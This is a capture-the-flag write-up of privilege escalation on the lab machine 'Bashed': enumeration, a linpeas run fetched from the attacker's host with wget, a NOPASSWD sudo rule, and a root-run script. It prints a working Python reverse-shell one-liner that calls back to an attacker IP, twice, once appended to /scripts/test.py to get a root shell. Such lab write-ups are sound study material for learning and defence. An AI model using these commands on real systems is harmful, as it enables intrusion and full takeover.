# Privesc

## Enumeration

I tried some basic enumeration from within the webshell, first checking `uname` and `id`:

```bash
www-data@bashed
:/var/www/html/dev# uname -a

Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

www-data@bashed
:/var/www/html/dev# id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then tried looking for suid binaries:

```bash
www-data@bashed:/var/www/html/dev# find / -perm 4000 2>/dev/null
```

The redirect to `/dev/null` did not work, so I'll spare you the `permission denied` error messages from `/proc`. It did not find any suid bits, but it did highlight some potentially interesting files in a `/scripts`  directory:

```bash
find: '/scripts/test.py': Permission denied  
find: '/scripts/test.txt': Permission denied  
find: '/root': Permission denied  
find: '/home/arrexel/.cache': Permission denied  
find: '/lost+found': Permission denied  
find: '/sys/fs/fuse/connections/38': Permission denied  
find: '/sys/kernel/debug': Permission denied
find: '/var/cache/ldconfig': Permission denied  
find: '/var/cache/apt/archives/partial': Permission denied  
find: '/var/spool/rsyslog': Permission denied  
find: '/var/spool/cron/crontabs/root': Permission denied  
find: '/var/log/apache2': Permission denied  
find: '/var/tmp/systemd-private-6bbc99fde6194264ac09780fc8275331-systemd-timesyncd.service-atvORU': Permission denied  
find: '/var/tmp/systemd-private-c2ef94ff0af9459f95f8df49a4191700-systemd-timesyncd.service-NAuxhT': Permission denied  
find: '/var/lib/apt/lists/partial': Permission denied  
find: '/var/lib/php/sessions': Permission denied  
find: '/run/sudo': Permission denied  
find: '/run/log/journal/37f474e246e601006b77c9705a259ee9': Permission denied  
find: '/run/systemd/inaccessible': Permission denied  
find: '/etc/ssl/private': Permission denied  
find: '/tmp/systemd-private-6bbc99fde6194264ac09780fc8275331-systemd-timesyncd.service-DAJK4C': Permission denied  
find: '/tmp/vmware-root': Permission denied
```

Enumerating files in arrexel:

```bash
www-data@bashed:/var/www/html/dev# ls -la /home/arrexel

total 36
drwxr-xr-x 4 arrexel arrexel 4096 Dec 4 2017 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
-rw------- 1 arrexel arrexel 1 Dec 23 2017 .bash_history
-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel 33 Dec 4 2017 user.txt
```

`.sudo_as_admin_successful` looks interesting, but is empty. The `.nano` directory was also empty.

The scripts directory was interesting, but I was blocked from looking at it:

```bash
www-data@bashed:/var/www/html/dev# ls -la /scripts
  
ls: cannot access '/scripts/..': Permission denied  
ls: cannot access '/scripts/test.py': Permission denied  
ls: cannot access '/scripts/test.txt': Permission denied  
ls: cannot access '/scripts/.': Permission denied  
total 0  
d????????? ? ? ? ? ? .  
d????????? ? ? ? ? ? ..  
\-????????? ? ? ? ? ? test.py  
\-????????? ? ? ? ? ? test.txt  

www-data@bashed:/var/www/html/dev# cat /scripts/test.py
  
cat: /scripts/test.py: Permission denied  

www-data@bashed:/var/www/html/dev# cat /scripts/test.txt
  
cat: /scripts/test.txt: Permission denied
```

I tried looking for other interesting files in `/var/www/html`. There was a `config.php` file, but nothing in it besides a fake email for the `php/sendMail.php` file.

I also tried reading the `.bash_history` files for `arrexel` and `scriptmanager`, but I was not allowed.

### Linpeas

I cracked and tried to run linpeas. As this is the first time I've done this in this series, I'll briefly explain the file transfer process. `linpeas.sh` is hosted on my box in a directory full of enumeration scripts. I can run a python server in this directory with `python3 -m http.server`, and download files from it with `wget [IP]:8000/linpeas.sh` - this is the easiest way to transfer files to the remote machine.

I downloaded it to the box, gave it permissions to be executed, and ran it:

```bash
www-data@bashed:/tmp# wget 10.10.14.13:8000/linpeas.sh

  
\--2021-05-05 02:18:03-- http://10.10.14.13:8000/linpeas.sh  
Connecting to 10.10.14.13:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 325084 (317K) \[text/x-sh\]  
Saving to: 'linpeas.sh'

www-data@bashed:/tmp# chmod +x linpeas.sh

  
chmod: invalid mode: 'x'  
Try 'chmod --help' for more information.  

www-data@bashed:/tmp# chmod 777 linpeas.sh

  

www-data@bashed:/tmp# ls -la

  
total 360  
drwxrwxrwt 10 root root 4096 May 5 02:18 .  
drwxr-xr-x 23 root root 4096 Dec 4 2017 ..  
drwxrwxrwt 2 root root 4096 May 5 00:29 .ICE-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .Test-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .X11-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .XIM-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .font-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 VMwareDnD  
\-rwxrwxrwx 1 www-data www-data 325084 Feb 11 07:48 linpeas.sh  
drwx------ 3 root root 4096 May 5 00:29 systemd-private-6bbc99fde6194264ac09780fc8275331-systemd-timesyncd.service-DAJK4C  
drwx------ 2 root root 4096 May 5 00:29 vmware-root  

www-data@bashed:/tmp# ./linpeas.sh
```

It was harder to read without colours, but `\[1;31m` prefix indicates red.

There were no interesting processes listed, although `dbus` was highlighted. It also highlighted `sudo` as being vulnerable, but that was to a recent CVE and I assumed that was an unintended path as the box was from 2018.

```bash
\[1;33m\[+\] \[1;32mSudo version  
\[0m\[1;34m\[i\] \[1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version  
\[0mSudo version \[1;31m1.8.16\[0m
\[1;33m\[+\] \[1;32mUSBCreator  
\[0m\[1;34m\[i\] \[1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation  
\[0m  
\[1;33m\[+\] \[1;32mPATH  
\[0m\[1;34m\[i\] \[1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses  
\[0m/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Then it highlighted the most basic of enum commands that I had forgotten - checking sudo privileges:

```bash
User \[1;31mwww-data\[0m may run the following commands on bashed:  
(scriptmanager : scriptmanager) \[1;31mNOPASSWD\[0m: \[1;31mALL\[0m
```

Besides this, it found no interesting `cron` jobs or SUID/SGID binaries, or any passwords.

## scriptmanager

As always, I've detailed the important parts of my experimenting as briefly as I can, and included anything new that I learned. Some of this may be obvious to those with more experience, so as always you can [[15 - Privesc#Editing test py to get a Shell as Root|skip to the working exploit]].

`www-data` can run commands as `scriptmanager`:

```bash
www-data@bashed:/# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

We can use this to read the contents of the `/scripts` directory:

```bash
www-data@bashed:/# sudo -u scriptmanager ls -la scripts

total 16
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 .
drwxr-xr-x 23 root root 4096 Dec 4 2017 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
-rw-r--r-- 1 root root 12 May 5 02:41 test.txt

www-data@bashed:/tmp# sudo -u scriptmanager cat /scripts/test.py

  
f = open("test.txt", "w")  
f.write("testing 123!")  
f.close
```

It looked like `test.txt` was owned by root but could still be written to, so I wondered if the `test.py` script somehow ran as root. I wanted to edit it to read the root flag, but was sick of my shell at this point, so tried harder to find one.

### Upgrading Shell

I ran this in the webshell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

And I got a lovely shell back:

![[Pasted image 20210505104808.png]]

I quickly upgraded my shell:

![[Pasted image 20210505114032.png]]

(i'm not sure why it says `nc -lnvp 9001` in the above)

### Experimenting with the Python Script

However I couldn't find an easy way to edit the file - using `vi` seemed to break down:

![[Pasted image 20210505105226.png]]

I could enter edit mode by pressing `i`, but the arrow keys didn't work and pressing delete just capitalised the characters...

![[Pasted image 20210505105452.png]]

I tried echoing some text:

```bash
www-data@bashed:/$ sudo -u scriptmanager echo 'f = open("/root/root.txt","r");print(f.read())'  >> /scripts/test.py
```

But got this error:

```bash
bash: /scripts/test.py: Permission denied
```

Again, with `>` instead of `>>`:

```bash
www-data@bashed:/$ sudo -u scriptmanager echo "a" > /scripts/test.py
bash: /scripts/test.py: Permission denied
```

It's as if it's trying to execute the final part of the command as `www-data`. I googled this and found [an example](https://unix.stackexchange.com/questions/4335/how-to-insert-text-into-a-root-owned-file-using-sudo) using `tee`:

```bash
echo 'f = open("/root/root.txt","r");print(f.read())' | sudo -u scriptmanager tee -a /scripts/test.py
f = open("/root/root.txt","r");print(f.read())
www-data@bashed:/$ sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
f = open("/root/root.txt","r");print(f.read())
```

This worked! However, running the script gives us a permission denied when opening the file:

```bash
www-data@bashed:/$ sudo -u scriptmanager python /scripts/test.py
Traceback (most recent call last):
  File "/scripts/test.py", line 1, in <module>
    f = open("test.txt", "w")
IOError: [Errno 13] Permission denied: 'test.txt'
```

### Editing test.py to get a Shell as Root

So the program does not run as root - but maybe a process running as root is setup to regularly run it?

Linpeas didn't show up a cron job, but I thought I'd take a shot at spawning a shell and hoping the script got executed. I edited it to reuse the shell command from before:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u scriptmanager tee -a /scripts/test.py
```

I checked that it looked okay:

```bash
www-data@bashed:/$ sudo -u scriptmanager cat /scripts/test.py   
f = open("test.txt", "w")
f.write("testing 123!")
f.close
f = open("/root/root.txt","r");print(f.read())
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Then I just waited...

After 30 seconds or so I got a shell!

![[Pasted image 20210505111640.png]]

We can grab the flag:

![[Pasted image 20210505112810.png]]

That's the box!

![[Pasted image 20210505111945.png]]

# Tags

#writeup #oscp-prep #file-misconfiguration 